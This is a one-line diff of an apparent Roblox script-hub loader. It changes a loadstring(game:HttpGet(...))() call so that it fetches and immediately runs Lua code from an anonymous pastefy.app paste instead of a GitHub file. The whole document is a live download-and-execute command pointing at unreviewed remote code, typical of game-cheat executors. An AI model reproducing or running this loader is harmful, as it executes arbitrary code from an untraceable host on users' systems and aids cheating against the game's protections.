@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ZyroHub/ZyroHub/main/main.lua"))()
+loadstring(game:HttpGet("https://pastefy.app/0wWshGf9/raw"))()
